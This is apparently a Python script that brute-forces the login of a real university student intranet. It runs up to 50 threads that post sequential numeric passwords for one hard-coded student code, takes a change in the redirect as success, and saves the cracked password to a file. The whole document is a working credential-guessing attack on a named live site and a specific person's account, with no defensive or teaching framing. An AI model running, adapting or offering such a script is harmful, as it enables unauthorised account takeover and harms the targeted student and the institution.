import requests
import threading
import time

total = 50
found = False
threads = 0
password = 200000
headers = {
  'Content-Type': 'application/x-www-form-urlencoded',
  'Connection': 'keep-alive'
}
def testPassword(codigo, password):
  global threads
  global found
  threads += 1
  data = {
    "tipo": "acceso",
    "codUni": codigo,
    "clave": password
  }
  try:
    r = requests.post('http://www.academico.uni.pe/intranet/public/alumno/entrar', data=data, headers=headers, allow_redirects=False)
    if r.headers["location"]!="http://www.academico.uni.pe/intranet/public/alumno/entrar":
      print("Password found", password)
      threads-=1
      found = True
      file = open("password.txt","w") 
      file.write(password) 
      file.close() 
      return
    else:
      threads-=1
      return 
  except ValueError:
    time.sleep(3)
    threads-=1
    return testPassword(codigo, password)

codigo = '20140417F'
print("Codigo", codigo)
while not found:
  if(threads < total):
    if(password %1000==0):
      print("testing", password)
    t = threading.Thread(target=testPassword, args=(codigo, str(password)))
    #threads.append(t)
    t.start()
    password+=1
  
    
